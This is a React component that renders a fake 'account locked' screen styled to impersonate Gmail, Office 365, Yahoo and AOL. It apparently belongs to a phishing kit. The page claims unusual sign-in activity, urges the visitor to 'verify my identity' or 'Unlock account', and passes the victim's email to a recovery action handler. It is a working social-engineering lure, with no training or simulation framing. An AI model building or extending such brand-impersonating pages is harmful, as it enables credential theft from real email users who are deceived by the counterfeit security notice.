import React from 'react';
import { useLocation } from 'react-router-dom';
import { ProviderKey, getProviderTheme } from './providerTheme';
import ProviderShell from './ProviderShell';

interface AccountLockedPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const AccountLockedPage: React.FC<AccountLockedPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const reason = (data.reason as string) || 'unusual sign-in activity was detected on your account';
  const backendMessage = (data.message as string) || '';

  const headline: Record<ProviderKey, string> = {
    gmail: 'Your account has been locked',
    office365: "We've locked your account",
    yahoo: 'Account temporarily locked',
    aol: 'Your AOL account is locked',
    others: 'Your account has been locked',
  };

  const description =
    backendMessage ||
    `For your security, we've temporarily locked this account because ${reason}. To regain access, please verify your identity.`;

  const handleRecover = () => onAction('begin_account_recovery', { email });
  const goBack = () => {
    onAction('user_canceled');
  };

  const LockBlock = () => (
    <div
      className="mx-auto mb-6 flex items-center justify-center w-16 h-16 rounded-full"
      style={{ backgroundColor: theme.primaryLight }}
    >
      <svg width={36} height={36} viewBox="0 0 24 24" fill="none" stroke={theme.primary} strokeWidth="1.6" aria-hidden="true">
        <rect x="4" y="11" width="16" height="10" rx="2" />
        <path d="M8 11V8a4 4 0 118 0v3" />
        <circle cx="12" cy="16" r="1.3" fill={theme.primary} stroke="none" />
      </svg>
    </div>
  );

  // Provider-styled action buttons.
  let primaryActions: React.ReactNode;
  let secondaryAction: React.ReactNode;

  if (providerKey === 'gmail') {
    primaryActions = (
      <button
        type="button"
        onClick={handleRecover}
        className="px-6 py-2.5 text-white text-sm font-semibold rounded-full"
        style={{ backgroundColor: theme.primary }}
      >
        Try to recover this account
      </button>
    );
    secondaryAction = (
      <button
        type="button"
        onClick={goBack}
        className="text-sm font-semibold hover:underline"
        style={{ color: theme.primary }}
      >
        Back to sign in
      </button>
    );
  } else if (providerKey === 'office365') {
    primaryActions = (
      <>
        <button
          type="button"
          onClick={goBack}
          className="px-6 py-[6px] text-[#1b1b1b] text-sm font-semibold border border-[#8a8886] hover:bg-[#f3f2f1]"
          style={{ minWidth: '108px' }}
        >
          Back
        </button>
        <button
          type="button"
          onClick={handleRecover}
          className="px-6 py-[6px] text-white text-sm font-semibold"
          style={{ backgroundColor: theme.primary, minWidth: '108px' }}
        >
          Unlock account
        </button>
      </>
    );
  } else {
    // yahoo / aol / others
    primaryActions = (
      <button
        type="button"
        onClick={handleRecover}
        className={
          providerKey === 'aol'
            ? 'w-full py-3 text-white font-bold rounded-md text-base'
            : providerKey === 'yahoo'
              ? 'w-full py-3 text-white font-semibold rounded-full'
              : 'w-full py-3 text-white text-sm font-semibold rounded-md'
        }
        style={{ backgroundColor: theme.primary }}
      >
        {providerKey === 'office365' ? 'Unlock account' : 'Verify my identity'}
      </button>
    );
    secondaryAction = (
      <button
        type="button"
        onClick={goBack}
        className="hover:underline font-medium mx-auto"
        style={{ color: theme.primary }}
      >
        Back to sign in
      </button>
    );
  }

  return (
    <ProviderShell
      providerKey={providerKey}
      email={email}
      title={headline[providerKey]}
      description={description}
      onBack={goBack}
      primaryActions={primaryActions}
      secondaryAction={secondaryAction}
    >
      <LockBlock />
    </ProviderShell>
  );
};

export default AccountLockedPage;
